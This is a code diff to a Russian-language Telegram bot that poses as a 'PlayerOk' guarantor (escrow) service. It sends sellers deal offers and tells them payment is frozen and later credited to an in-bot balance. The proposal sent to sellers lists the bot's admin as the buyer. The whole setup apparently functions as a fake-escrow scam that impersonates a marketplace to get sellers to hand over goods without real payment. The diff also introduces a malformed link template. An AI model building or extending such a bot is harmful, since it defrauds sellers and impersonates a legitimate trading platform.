@@ -16,30 +16,9 @@ const mainKb = Markup.inlineKeyboard([
   [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
 ]);
 
-// Поддержка deep-linking (вход по ссылке на сделку t.me/bot?start=dealId)
 bot.start((ctx) => {
   const username = ctx.from.username;
-  if (username) {
-    users[username.toLowerCase()] = ctx.chat.id;
-  }
-  
-  const startPayload = ctx.startPayload;
-  if (startPayload && startPayload.startsWith('ok_')) {
-    const dealId = startPayload.replace('ok_', '');
-    const d = deals[dealId];
-    if (d && d.seller.toLowerCase() === (username || '').toLowerCase()) {
-      d.s_chat = ctx.chat.id;
-      d.status = 'accepted';
-      
-      bot.telegram.sendMessage(d.b_chat, `🔔 *Продавец @${d.seller} принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${d.title}\n💰 *Сумма:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВнесите оплату с баланса аккаунта для заморозки средств:`, 
-        Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]])
-      ).catch((e) => console.log(e));
-
-      const sellerText = `🤝 *Вы приняли условия безопасной сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на счет Гаранта PlayerOk.`;
-      return ctx.replyWithMarkdown(sellerText).catch((e) => console.log(e));
-    }
-  }
-
+  if (username) users[username.toLowerCase()] = ctx.chat.id;
   if (ctx.session) ctx.session = {};
   return ctx.replyWithMarkdown(welcomeText, mainKb).catch((e) => console.log(e));
 });
@@ -57,8 +36,27 @@ bot.action('create', (ctx) => {
 });
 
 bot.on('text', async (ctx) => {
-  if (!ctx.session || !ctx.session.step) return;
   const txt = ctx.message.text.trim();
+  const username = ctx.from.username;
+  if (username) users[username.toLowerCase()] = ctx.chat.id;
+
+  // Проверка глубокой ссылки активации сделки через /start ok_123456
+  if (txt.startsWith('/start ok_')) {
+    const dealId = txt.split(' ')[1].replace('ok_', '');
+    const d = deals[dealId];
+    if (d && d.seller.toLowerCase() === (username || '').toLowerCase()) {
+      d.s_chat = ctx.chat.id;
+      d.status = 'accepted';
+      
+      bot.telegram.sendMessage(d.b_chat, `🔔 *Продавец @${d.seller} принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${d.title}\n💰 *Сумма:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВнесите оплату с баланса аккаунта для заморозки средств:`, 
+        Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]])
+      ).catch((e) => console.log(e));
+
+      return ctx.replyWithMarkdown(`🤝 *Вы приняли условия безопасной сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на счет Гаранта PlayerOk.`).catch((e) => console.log(e));
+    }
+  }
+
+  if (!ctx.session || !ctx.session.step) return;
 
   if (ctx.session.step === 'partner') {
     ctx.session.partner = txt.replace('@', '').toLowerCase();
@@ -77,7 +75,7 @@ bot.on('text', async (ctx) => {
     ctx.session = {};
 
     const botUser = ctx.botInfo.username;
-    const link = `t.me/${botUser}?start=ok_${dealId}`;
+    const link = `https://t.me{botUser}?start=ok_${dealId}`;
 
     const propText = `🔔 *Вам поступило предложение о продаже!* (#${dealId})\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${deals[dealId].title}\n💰 *Вы получите:* ${price.toLocaleString('ru-RU')} руб.\n🛒 *Покупатель:* @${ADMIN}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ *ПРОТОКОЛ БЕЗОПАСНОСТИ:*\n• Вы обязаны фиксировать на видео момент передачи товара.\n• Запрещено уводить покупателя в сторонние чаты.\n• Попытка обмана приведет к блокировке средств.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы согласны открыть сделку под защитой Гаранта PlayerOk?`;
 
@@ -87,7 +85,6 @@ bot.on('text', async (ctx) => {
       ctx.replyWithMarkdown(`✨ *Бланк сделки #${dealId} сформирован!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛒 *Роль:* ПОКУПАТЕЛЬ\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚀 Предложение автоматически отправлено продавцу @${deals[dealId].seller}...`);
       bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять условия', `ok_${dealId}`)]]) }).catch((e) => console.log(e));
     } else {
-      // Кнопка-ссылка, которую можно переслать напрямую продавцу, если он не в сети бота
       ctx.replyWithMarkdown(`✨ *Бланк сделки #${dealId} сформирован!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛒 *Роль:* ПОКУПАТЕЛЬ\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⚠️ Продавец @${deals[dealId].seller} сейчас не в сети бота.\n\nПерешлите ему сообщение или кнопку ниже, чтобы он открыл её:`, 
         Markup.inlineKeyboard([[Markup.button.url('🤝 Передать сделку продавцу', link)]])
       );
@@ -140,6 +137,7 @@ bot.action(/^end_(.+)$/, (ctx) => {
   bot.telegram.sendMessage(d.s_chat, `🎉 *Сделка #${d.id} завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nПокупатель подтвердил получение. Выплата в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно зачислена на баланс вашего профиля.`, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
   return ctx.editMessageText(`🎉 *Сделка #${d.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Средства переведены продавцу.\n\n✨ Спасибо за доверие к гарант-сервису *PlayerOk*!`, 
     { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }
-  ).catch((e) => console.log(e));
+  ).catch(() => {});
 });
 
+bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }).catch((e) => console.log(e)));
